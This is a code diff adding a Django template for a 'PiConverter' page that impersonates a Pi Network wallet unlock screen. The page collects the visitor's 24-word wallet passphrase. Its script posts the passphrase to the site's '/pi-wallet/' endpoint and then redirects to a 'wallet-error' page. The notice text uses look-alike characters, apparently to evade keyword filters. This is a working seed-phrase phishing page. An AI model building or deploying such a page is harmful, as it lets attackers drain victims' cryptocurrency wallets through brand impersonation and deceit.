@@ -1,0 +1,125 @@
+{% load static %}
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <meta name="description" content="Pi Converter, Blockchain, A Fast And Reliable Way to Exchange Your Pi Coin, Whit Trust And Garantee.." /> 
+    <link rel="canonical" href="https://{{request.path_info}}" />               
+    <meta property="og:site_name" content="PiConverter" />
+<meta property="og:type" content="website" />
+<meta property="og:title" content="Pi Converter, Blockchain, Community & Developer Platform | Pi Network" />
+<meta property="og:description" content="Pi Converter, Blockchain, A Fast And Reliable Way to Exchange Your Pi Coin, Whit Trust And Garantee." />
+<meta property="og:image" content="https://PiConverter.info{% static '' %}" />
+<meta property="og:locale" content="en_us" />
+<meta property="og:url" content="https://PiConverter.info{{request.path_info}}" />
+<meta name="twitter:site" content="@PiConverter" />
+<meta name="twitter:title" content="" />
+<meta name="twitter:description" content="Pi Converter, Blockchain, A Fast And Reliable Way to Exchange Your Pi Coin, Whit Trust And Garantee.." />
+<meta name="twitter:creator" content="@PiNetwork" />
+<meta name="twitter:image" content="https://{% static '' %}" />
+<meta property="twiter:card" content="summary_large_image" />
+<meta name="twitter:image:alt" content="PiConverter Logo" />
+      <link rel="stylesheet" href="{% static 'piconverterapp/styles/docs.css' %}">
+      <link rel="apple-touch-icon" sizes="180x180" href="{% static 'piconverterapp/favicon.io/apple-touch-icon.png' %}">
+      <link rel="icon" type="image/png" sizes="32x32" href="{% static 'piconverterapp/favicon.io/favicon-32x32.png' %}">
+      <link rel="icon" type="image/png" sizes="16x16" href="{% static 'piconverterapp/favicon.io/favicon-16x16.png' %}">
+      <link rel="manifest" href="{% static 'piconverterapp/favicon.io/site.webmanifest' %}">  
+
+    <title>Pi Wallet </title>
+</head>
+
+<style>
+    
+</style>
+
+
+<body>
+    <header class="wallet-head">
+        <nav class="wallet-nav">
+            <a href="">
+                <button class="row">
+                    &leftarrow;
+                </button>
+            </a>
+            <aside style="display:flex; align-items:center;justify-content:center;">
+                <img class="iig" src="{% static 'piconverterapp/media/wallet2.png' %}" alt="">  wallet
+            </aside>
+        </nav>
+    </header>
+
+    <!-- main sect -->
+     <section class="main-sect" id="via">
+        <a href="{% url 'piconverterapp:wallet-error' %}" id="link-tag"></a>
+        <form method="post" id="form" loading="lazy">
+           <wt-tkn id="us_tkn">{% csrf_token %}</wt-tkn>
+            <h2>Unlock Pi Wallet</h2>
+            <br>
+            <textarea name="passph" id="passph" rows="1"  cols="1" placeholder="Enter your 24-passphrase" style="border-radius: 10px;padding:5px;" ></textarea>
+            <br>
+            <span style="color: firebrick; font-size:13px;" id="msg">
+                
+            </span>
+            <br>
+            <button class="sub-btn" value="submit">
+                Unlock with passphrase
+            </button>
+            <br>
+            <button disabled  class="sub-btn" style="background-color: rebeccapurple; color:#fff;">
+                Unlock with Fingerprint
+            </button>
+            <script>
+
+                let pass = document.getElementById('passph')
+                let form = document.getElementById('form')
+                var _tkn = document.getElementById('us_tkn').children[0].getAttribute('value');
+
+                form.addEventListener('submit', (e)=> {
+                    e.preventDefault();
+                    if (pass.value == "") {
+                     document.getElementById('msg').textContent = 'Invalid passpharse'
+                    }
+                    else{
+                    var _url = '/pi-wallet/';
+        var form_data = new FormData();
+        form_data.append('pharse', pass.value);
+
+        fetch (_url, {
+            method: 'POST',
+            headers: {
+                'X-CSRFToken': _tkn,
+            },
+            body: form_data,
+        })
+        .then(response => response.json())
+        .then(data => {
+            if(data.S){
+                const a = document.getElementById('link-tag')
+                a.click()
+            }
+        })
+        .catch((error) => {
+            console.log(error)
+        })
+
+                    }
+                })
+            </script>
+
+        </form>
+        <br>
+        <br>
+        <aside class="inform">
+           <aside>
+            As a non-custodiăl wăllet, your wrăllet păssphrăse is exclusively accessible only to you. Récovery of păssphrăse is currently impossible.
+            <br>
+            <br>
+            <br>
+            Lost your păssphrăse?<a href="">You can create a new wăllet</a>, but all your π in your previous wăllet will be inaccessible. 
+           </aside>  
+        </aside>
+     </section>
+
+</body>
+</html>
+
